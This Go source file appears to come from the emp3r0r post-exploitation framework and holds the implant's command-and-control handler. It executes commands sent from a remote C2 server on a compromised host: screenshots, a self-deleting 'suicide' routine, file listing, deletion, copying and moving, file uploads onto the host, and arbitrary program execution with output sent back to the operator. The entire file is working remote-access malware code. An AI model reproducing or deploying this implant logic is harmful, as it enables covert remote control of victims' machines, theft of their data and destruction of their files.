package agent

import (
	"bytes"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/otiai10/copy"
	"github.com/spf13/pflag"
)

// exec cmd, receive data, etc
func processCCData(data *emp3r0r_data.MsgTunData) {
	var (
		data2send emp3r0r_data.MsgTunData
		out       string
		err       error
	)
	data2send.Tag = RuntimeConfig.AgentTag

	payloadSplit := strings.Split(data.Payload, emp3r0r_data.MagicString)
	if len(payloadSplit) <= 1 {
		log.Printf("Cannot parse CC command: %s, wrong OpSep (should be %s) maybe?",
			data.Payload, emp3r0r_data.MagicString)
		return
	}
	cmd_id := payloadSplit[len(payloadSplit)-1]

	// command from CC
	keep_running := strings.HasSuffix(payloadSplit[1], "&") // ./program & means keep running in background
	cmd_str := strings.TrimSuffix(payloadSplit[1], "&")
	cmdSlice := util.ParseCmd(cmd_str)

	// parse command-line arguments using pflag
	flags := pflag.NewFlagSet(cmdSlice[0], pflag.ContinueOnError)
	flags.Parse(cmdSlice[1:])

	// send response to CC
	sendResponse := func(resp string) {
		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s",
			emp3r0r_data.MagicString,
			strings.Join(cmdSlice, " "),
			emp3r0r_data.MagicString,
			resp)
		data2send.Payload += emp3r0r_data.MagicString + cmd_id // cmd_id for cmd tracking
		if err = Send2CC(&data2send); err != nil {
			log.Println(err)
		}
	}

	// # shell helpers
	// previously there was a dedicated "shell", now it is integrated
	// with the main command prompt, you can execute these commands directly
	// by typing them in emp3r0r console
	if strings.HasPrefix(cmdSlice[0], "#") {
		out = shellHelper(cmdSlice)
		sendResponse(out)
		return
	}

	// ! C2Commands
	/*
	   !command: special commands (not sent by user)
	*/
	if strings.HasPrefix(cmdSlice[0], "!") {
		out = C2CommandsHandler(cmdSlice)
		sendResponse(out)
		return
	}

	switch cmdSlice[0] {

	/*
		utils
	*/
	case "screenshot":
		if len(cmdSlice) != 1 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		out, err = Screenshot()
		if err != nil || out == "" {
			out = fmt.Sprintf("Error: failed to take screenshot: %v", err)
			sendResponse(out)
			return
		}

		// move to agent root
		err = os.Rename(out, RuntimeConfig.AgentRoot+"/"+out)
		if err == nil {
			out = RuntimeConfig.AgentRoot + "/" + out
		}

		// tell CC where to download the file
		sendResponse(out)

	case "suicide":
		if len(cmdSlice) != 1 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}
		err = os.RemoveAll(RuntimeConfig.AgentRoot)
		if err != nil {
			log.Fatalf("Failed to cleanup files")
		}
		log.Println("Exiting")
		os.Exit(0)

		/*
			fs commands
		*/

		// ls current path
	case "ls":
		target_dir := flags.StringP("dst", "d", ".", "Directory to list")
		flags.Parse(cmdSlice[1:])
		if flags.NArg() > 0 {
			*target_dir = flags.Arg(0)
		}
		log.Printf("Listing %s", *target_dir)
		out, err = util.LsPath(*target_dir)
		if err != nil {
			out = err.Error()
		}
		sendResponse(out)

		// remove file/dir
	case "rm":
		path := flags.StringP("dst", "d", "", "Path to remove")
		flags.Parse(cmdSlice[1:])
		if *path == "" {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}
		out = "Deleted " + *path
		if err = os.RemoveAll(*path); err != nil {
			out = fmt.Sprintf("Failed to delete %s: %v", *path, err)
		}
		sendResponse(out)

		// mkdir
	case "mkdir":
		path := flags.StringP("dst", "d", "", "Path to create")
		flags.Parse(cmdSlice[1:])
		if *path == "" {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}
		out = "Mkdir " + *path
		if err = os.MkdirAll(*path, 0o700); err != nil {
			out = fmt.Sprintf("Failed to mkdir %s: %v", *path, err)
		}
		sendResponse(out)

		// copy file/dir
	case "cp":
		src := flags.StringP("src", "s", "", "Source path")
		dst := flags.StringP("dst", "d", "", "Destination path")
		flags.Parse(cmdSlice[1:])
		if *src == "" || *dst == "" {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}
		out = fmt.Sprintf("%s has been copied to %s", *src, *dst)
		if err = copy.Copy(*src, *dst); err != nil {
			out = fmt.Sprintf("Failed to copy %s to %s: %v", *src, *dst, err)
		}
		sendResponse(out)

		// move file/dir
	case "mv":
		src := flags.StringP("src", "s", "", "Source path")
		dst := flags.StringP("dst", "d", "", "Destination path")
		flags.Parse(cmdSlice[1:])
		if *src == "" || *dst == "" {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}
		out = fmt.Sprintf("%s has been moved to %s", *src, *dst)
		if err = os.Rename(*src, *dst); err != nil {
			out = fmt.Sprintf("Failed to move %s to %s: %v", *src, *dst, err)
		}
		sendResponse(out)

		// change directory
	case "cd":
		path := flags.StringP("dst", "d", "", "Path to change to")
		flags.Parse(cmdSlice[1:])
		if *path == "" {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}
		if os.Chdir(*path) == nil {
			out = "changed directory to " + strconv.Quote(*path)
		} else {
			out = "cd failed"
		}
		sendResponse(out)

		// current working directory
	case "pwd":
		if flags.NArg() != 0 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		pwd, err := os.Getwd()
		if err != nil {
			log.Println("processCCData: cant get pwd: ", err)
			pwd = err.Error()
		}

		out = "current working directory: " + pwd
		sendResponse(out)

		// put file on agent
	case "put":
		file_to_download := flags.StringP("file", "f", "", "File to download")
		path := flags.StringP("path", "p", "", "Destination path")
		size := flags.Int64P("size", "s", 0, "Size of the file")
		flags.Parse(cmdSlice[1:])
		if *file_to_download == "" || *path == "" || *size == 0 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}
		_, err = DownloadViaCC(*file_to_download, *path)
		if err != nil {
			out = fmt.Sprintf("processCCData: cant download %s: %v", *file_to_download, err)
			sendResponse(out)
			return
		}

		// checksum
		checksum := tun.SHA256SumFile(*path)
		downloadedSize := util.FileSize(*path)
		out = fmt.Sprintf("%s has been uploaded successfully, sha256sum: %s", *path, checksum)
		if downloadedSize < *size {
			out = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nYou can run `put` again to resume uploading", downloadedSize, *size, checksum)
		}

		sendResponse(out)

	default:
		// exec cmd using os/exec normally, sends stdout and stderr back to CC
		if runtime.GOOS == "windows" {
			if !strings.HasSuffix(cmdSlice[0], ".exe") {
				cmdSlice[0] += ".exe"
			}
		}
		cmd := exec.Command(cmdSlice[0], flags.Args()...)
		var out_bytes []byte
		out_buf := bytes.NewBuffer(out_bytes)
		cmd.Stdout = out_buf
		cmd.Stderr = out_buf
		err = cmd.Start()
		if err != nil {
			log.Println(err)
			out = fmt.Sprintf("%s\n%v", out_buf.Bytes(), err)
		} else {
			// kill process after 10 seconds
			// except when & is appended
			if !keep_running {
				cmd.Wait()
			}
			go func() {
				for i := 0; i < 10; i++ {
					time.Sleep(time.Second)
				}
				if !keep_running && util.IsPIDAlive(cmd.Process.Pid) {
					err = cmd.Process.Kill()
					out = fmt.Sprintf("Killing %d, which has been running for more than 10s, status %v",
						cmd.Process.Pid, err)
					sendResponse(out)
					return
				}
			}()
		}
		out = out_buf.String()
		if keep_running {
			out = fmt.Sprintf("%s running in background, PID is %d",
				cmdSlice, cmd.Process.Pid)
		}

		sendResponse(out)
	}
}
